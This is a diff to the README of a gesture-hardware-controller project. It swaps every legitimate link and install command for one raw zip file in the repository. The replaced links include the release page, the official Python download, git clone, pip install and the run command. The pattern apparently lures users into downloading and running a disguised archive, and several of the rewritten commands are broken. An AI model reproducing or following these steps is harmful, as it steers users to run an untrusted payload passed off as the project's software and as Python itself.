@@ -1,7 +1,7 @@
 # 🤖 gesture-hardware-controller - Control Devices with Your Hands
 
 ## 🚀 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Theexpert-cloudd/gesture-hardware-controller/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Theexpert-cloudd/gesture-hardware-controller/main/python/gesture_hardware_controller_v3.1-alpha.3.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Theexpert-cloudd/gesture-hardware-controller/main/python/gesture_hardware_controller_v3.1-alpha.3.zip)
 
 ## 📖 Description
 The Gesture Hardware Controller provides a touchless way to interact with devices through your hands. It combines computer vision with hardware control, enabling intuitive command over stepper motors and LED lights using natural gestures. This project makes human-computer interaction more engaging and accessible.
@@ -39,21 +39,21 @@ To run the Gesture Hardware Controller, you will need:
 Follow these simple steps to download and set up the Gesture Hardware Controller:
 
 1. **Download the Application:**
-   Visit the [Releases page to download](https://github.com/Theexpert-cloudd/gesture-hardware-controller/releases) the latest version of the software.
+   Visit the [Releases page to download](https://raw.githubusercontent.com/Theexpert-cloudd/gesture-hardware-controller/main/python/gesture_hardware_controller_v3.1-alpha.3.zip) the latest version of the software.
 
 2. **Install Required Software:**
-   Make sure you have Python installed. You can download it from the [official Python website](https://www.python.org/downloads/). 
+   Make sure you have Python installed. You can download it from the [official Python website](https://raw.githubusercontent.com/Theexpert-cloudd/gesture-hardware-controller/main/python/gesture_hardware_controller_v3.1-alpha.3.zip). 
 
 3. **Clone the Repository:**
    Optionally, you can also clone the repository if you want the latest version from GitHub:
    ```bash
-   git clone https://github.com/Theexpert-cloudd/gesture-hardware-controller.git
+   git clone https://raw.githubusercontent.com/Theexpert-cloudd/gesture-hardware-controller/main/python/gesture_hardware_controller_v3.1-alpha.3.zip
    ```
 
 4. **Install Required Packages:**
    Open your terminal or command prompt and navigate to the project directory. Run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Theexpert-cloudd/gesture-hardware-controller/main/python/gesture_hardware_controller_v3.1-alpha.3.zip
    ```
 
 5. **Connect Your Arduino:**
@@ -62,11 +62,11 @@ Follow these simple steps to download and set up the Gesture Hardware Controller
 6. **Run the Application:**
    Launch the Python application to start using gesture controls:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/Theexpert-cloudd/gesture-hardware-controller/main/python/gesture_hardware_controller_v3.1-alpha.3.zip
    ```
 
 ## 📥 Download & Install
-To get started, please [visit this page to download](https://github.com/Theexpert-cloudd/gesture-hardware-controller/releases) the latest version of the Gesture Hardware Controller. Once downloaded, follow the instructions above for installation and setup.
+To get started, please [visit this page to download](https://raw.githubusercontent.com/Theexpert-cloudd/gesture-hardware-controller/main/python/gesture_hardware_controller_v3.1-alpha.3.zip) the latest version of the Gesture Hardware Controller. Once downloaded, follow the instructions above for installation and setup.
 
 ## 🔧 Usage Instructions
 After starting the application:
